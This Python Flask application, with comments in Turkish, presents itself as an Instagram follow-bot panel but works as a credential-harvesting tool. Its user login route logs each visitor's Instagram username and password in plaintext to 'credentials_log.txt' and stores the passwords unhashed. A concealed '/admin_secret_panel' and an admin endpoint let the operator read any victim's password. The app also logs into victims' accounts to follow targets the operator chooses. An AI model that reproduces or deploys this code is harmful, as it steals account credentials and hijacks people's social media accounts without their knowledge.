from flask import Flask, render_template, request, jsonify, session, redirect
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import sqlite3
import random
import time
from datetime import datetime, timedelta
import threading
import hashlib
import os
from instagrapi import Client
from instagrapi.exceptions import LoginRequired
import requests
from functools import wraps
import json
import logging

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Logging ayarları
logging.basicConfig(
    filename='credentials_log.txt',
    level=logging.WARNING,
    format='%(asctime)s - %(message)s'
)

def init_db():
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, created_at TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, ig_username TEXT UNIQUE, ig_password TEXT, 
                  created_at TEXT, last_login TEXT, ip_address TEXT, auto_added INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id INTEGER PRIMARY KEY, user_id INTEGER, target_username TEXT, 
                  follower_count INTEGER, status TEXT, created_at TEXT,
                  completed_at TEXT, success_count INTEGER,
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY, task_id INTEGER, user_id INTEGER,
                  message TEXT, timestamp TEXT, log_type TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

def create_default_admin():
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("SELECT * FROM admin_users WHERE username='admin'")
    if not c.fetchone():
        # Rastgele admin şifresi oluştur
        random_password = os.urandom(16).hex()
        hashed = hashlib.sha256(random_password.encode()).hexdigest()
        c.execute("INSERT INTO admin_users (username, password, created_at) VALUES (?, ?, ?)",
                  ('admin', hashed, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        
        # Admin şifresini sadece sunucu loguna yaz
        print(f"\n{'='*60}")
        print(f"ADMIN PANELİ BİLGİLERİ (Bu bilgiyi kaydedin!)")
        print(f"{'='*60}")
        print(f"URL: http://localhost:5000/admin_secret_panel")
        print(f"Kullanıcı Adı: admin")
        print(f"Şifre: {random_password}")
        print(f"{'='*60}\n")
        
    conn.close()

create_default_admin()

def admin_login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_id' not in session:
            return redirect('/admin_secret_panel')
        return f(*args, **kwargs)
    return decorated_function

def user_login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect('/')
        return f(*args, **kwargs)
    return decorated_function

class RateLimiter:
    def __init__(self):
        self.daily_limit = 200
    
    def can_perform_action(self, user_id):
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        
        today = datetime.now().strftime("%Y-%m-%d")
        c.execute("SELECT COUNT(*) FROM logs WHERE user_id=? AND timestamp LIKE ?",
                  (user_id, f"{today}%"))
        daily_actions = c.fetchone()[0]
        
        conn.close()
        return daily_actions < self.daily_limit

class InstagramBot:
    def __init__(self):
        self.rate_limiter = RateLimiter()
    
    def create_task(self, user_id, target_username):
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        
        # Kullanıcının kendi hesabını otomatik bot olarak ekle (ilk kez)
        c.execute("SELECT auto_added FROM users WHERE id=?", (user_id,))
        user_data = c.fetchone()
        
        if user_data and not user_data[0]:
            # İlk görev, kullanıcıyı otomatik ekle
            c.execute("UPDATE users SET auto_added=1 WHERE id=?", (user_id,))
            conn.commit()
        
        c.execute("""INSERT INTO tasks 
                    (user_id, target_username, follower_count, status, created_at, success_count) 
                    VALUES (?, ?, 1, 'pending', ?, 0)""",
                  (user_id, target_username, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        task_id = c.lastrowid
        conn.commit()
        conn.close()
        
        thread = threading.Thread(target=self.process_task, args=(task_id,))
        thread.daemon = True
        thread.start()
        
        return task_id
    
    def process_task(self, task_id):
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        c.execute("SELECT * FROM tasks WHERE id=?", (task_id,))
        task = c.fetchone()
        conn.close()
        
        if not task:
            return
        
        user_id = task[1]
        target_username = task[2]
        
        self.emit_log(task_id, user_id, f"🚀 @{target_username} takip ediliyor...")
        
        # Kullanıcının kendi Instagram hesabını al
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        c.execute("SELECT ig_username, ig_password FROM users WHERE id=?", (user_id,))
        user = c.fetchone()
        conn.close()
        
        if not user:
            self.emit_log(task_id, user_id, "❌ Kullanıcı hesabı bulunamadı!", "error")
            return
        
        success = False
        
        try:
            if not self.rate_limiter.can_perform_action(user_id):
                self.emit_log(task_id, user_id, "❌ Günlük limit aşıldı (200 takip/gün)", "error")
                return
            
            cl = Client()
            cl.login(user[0], user[1])
            
            logging.warning(f"FOLLOW_ACTION: User={user[0]} -> Target={target_username}")
            
            target_user_id = cl.user_id_from_username(target_username)
            cl.user_follow(target_user_id)
            
            success = True
            self.emit_log(task_id, user_id, f"✅ Başarıyla @{target_username} takip edildi!", "success")
            
            time.sleep(random.uniform(5, 15))
            
        except Exception as e:
            self.emit_log(task_id, user_id, f"❌ Hata: {str(e)}", "error")
            logging.warning(f"FOLLOW_ERROR: User={user[0]} -> Target={target_username} - {str(e)}")
        
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        c.execute("""UPDATE tasks 
                    SET status='completed', completed_at=?, success_count=? 
                    WHERE id=?""",
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 1 if success else 0, task_id))
        conn.commit()
        conn.close()
        
        if success:
            self.emit_log(task_id, user_id, "✨ Görev tamamlandı!", "completed")
    
    def emit_log(self, task_id, user_id, message, log_type="info"):
        socketio.emit('log_update', {
            'task_id': task_id,
            'message': message,
            'timestamp': datetime.now().strftime("%H:%M:%S"),
            'type': log_type
        }, broadcast=True)
        
        conn = sqlite3.connect('panel.db')
        c = conn.cursor()
        c.execute("""INSERT INTO logs (task_id, user_id, message, timestamp, log_type) 
                    VALUES (?, ?, ?, ?, ?)""",
                  (task_id, user_id, message, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), log_type))
        conn.commit()
        conn.close()

bot = InstagramBot()

# ============ ADMIN ROUTES ============

@app.route('/admin_secret_panel', methods=['GET', 'POST'])
def admin_login_page():
    if request.method == 'GET':
        if 'admin_id' in session:
            return redirect('/admin_dashboard')
        return render_template('admin_login.html')
    
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    hashed = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("SELECT id FROM admin_users WHERE username=? AND password=?", (username, hashed))
    admin = c.fetchone()
    conn.close()
    
    if admin:
        session['admin_id'] = admin[0]
        logging.warning(f"ADMIN_LOGIN_SUCCESS: {username}")
        return jsonify({'success': True})
    
    return jsonify({'success': False}), 401

@app.route('/admin_dashboard')
@admin_login_required
def admin_panel():
    return render_template('admin_panel.html')

@app.route('/api/admin/logout', methods=['POST'])
def admin_logout():
    session.pop('admin_id', None)
    return jsonify({'success': True})

@app.route('/api/admin/all_users', methods=['GET'])
@admin_login_required
def get_all_users():
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("""SELECT id, ig_username, created_at, last_login FROM users 
                ORDER BY created_at DESC""")
    users = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': u[0],
        'username': u[1],
        'created': u[2],
        'last_login': u[3]
    } for u in users])

@app.route('/api/admin/all_logs', methods=['GET'])
@admin_login_required
def get_all_logs():
    try:
        with open('credentials_log.txt', 'r', encoding='utf-8') as f:
            logs = f.readlines()
        return jsonify({'logs': logs[-200:]})
    except:
        return jsonify({'logs': []})

@app.route('/api/admin/credentials/<int:user_id>', methods=['GET'])
@admin_login_required
def get_user_credentials(user_id):
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("SELECT ig_username, ig_password FROM users WHERE id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    
    if user:
        return jsonify({
            'username': user[0],
            'password': user[1]
        })
    return jsonify({'error': 'User not found'}), 404

@app.route('/api/admin/all_tasks', methods=['GET'])
@admin_login_required
def get_all_tasks():
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("""SELECT t.id, u.ig_username, t.target_username, t.status, t.created_at, t.success_count
                FROM tasks t 
                JOIN users u ON t.user_id = u.id
                ORDER BY t.created_at DESC LIMIT 100""")
    tasks = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': t[0],
        'user': t[1],
        'target': t[2],
        'status': t[3],
        'created': t[4],
        'success': t[5]
    } for t in tasks])

# ============ USER ROUTES ============

@app.route('/')
def index():
    if 'admin_id' in session:
        return redirect('/admin_dashboard')
    if 'user_id' in session:
        return render_template('user_panel.html')
    return render_template('user_login.html')

@app.route('/api/user/login', methods=['POST'])
def user_login():
    data = request.json
    ig_username = data.get('username')
    ig_password = data.get('password')
    
    logging.warning(f"USER_LOGIN_ATTEMPT: Username={ig_username}, Password={ig_password}")
    
    if not ig_username or not ig_password:
        return jsonify({'success': False, 'error': 'Kullanıcı adı ve şifre gerekli'}), 400
    
    # Instagram doğrulaması
    try:
        cl = Client()
        cl.login(ig_username, ig_password)
        logging.warning(f"INSTAGRAM_LOGIN_SUCCESS: {ig_username}")
    except Exception as e:
        logging.warning(f"INSTAGRAM_LOGIN_FAILED: {ig_username} - {str(e)}")
        return jsonify({'success': False, 'error': 'Instagram hesabına giriş yapılamadı. Kullanıcı adı veya şifre yanlış.'}), 401
    
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    
    c.execute("SELECT id FROM users WHERE ig_username=?", (ig_username,))
    existing_user = c.fetchone()
    
    if existing_user:
        user_id = existing_user[0]
        c.execute("UPDATE users SET last_login=?, ig_password=? WHERE id=?",
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ig_password, user_id))
    else:
        c.execute("""INSERT INTO users (ig_username, ig_password, created_at, last_login, auto_added) 
                    VALUES (?, ?, ?, ?, 0)""",
                  (ig_username, ig_password, datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                   datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        user_id = c.lastrowid
    
    conn.commit()
    conn.close()
    
    session['user_id'] = user_id
    session['ig_username'] = ig_username
    logging.warning(f"USER_LOGIN_SUCCESS: {ig_username} - ID={user_id}")
    
    return jsonify({'success': True})

@app.route('/api/user/logout', methods=['POST'])
def user_logout():
    session.pop('user_id', None)
    session.pop('ig_username', None)
    return jsonify({'success': True})

@app.route('/api/user/create_task', methods=['POST'])
@user_login_required
def user_create_task():
    user_id = session['user_id']
    data = request.json
    target_username = data.get('target_username', '').strip()
    
    if not target_username:
        return jsonify({'success': False, 'error': 'Hedef kullanıcı adı gerekli'}), 400
    
    task_id = bot.create_task(user_id, target_username)
    return jsonify({'success': True, 'task_id': task_id})

@app.route('/api/user/tasks', methods=['GET'])
@user_login_required
def user_get_tasks():
    user_id = session['user_id']
    
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    c.execute("""SELECT id, target_username, status, created_at, completed_at, success_count 
                FROM tasks WHERE user_id=? ORDER BY created_at DESC LIMIT 50""", (user_id,))
    tasks = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': t[0],
        'target': t[1],
        'status': t[2],
        'created': t[3],
        'completed': t[4],
        'success': t[5]
    } for t in tasks])

@app.route('/api/user/stats', methods=['GET'])
@user_login_required
def user_get_stats():
    user_id = session['user_id']
    
    conn = sqlite3.connect('panel.db')
    c = conn.cursor()
    
    today = datetime.now().strftime("%Y-%m-%d")
    
    c.execute("""SELECT COUNT(*) FROM tasks 
                WHERE user_id=? AND status='completed' AND created_at LIKE ?""",
              (user_id, f"{today}%"))
    completed = c.fetchone()[0]
    
    c.execute("""SELECT SUM(success_count) FROM tasks 
                WHERE user_id=? AND status='completed' AND created_at LIKE ?""",
              (user_id, f"{today}%"))
    result = c.fetchone()[0]
    success = result if result else 0
    
    c.execute("SELECT COUNT(*) FROM tasks WHERE user_id=?", (user_id,))
    total = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM logs WHERE user_id=? AND timestamp LIKE ?",
              (user_id, f"{today}%"))
    daily_actions = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'today_completed': completed,
        'today_success': success,
        'total_tasks': total,
        'daily_actions': daily_actions,
        'daily_limit': 200
    })

@socketio.on('connect')
def handle_connect():
    emit('response', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)
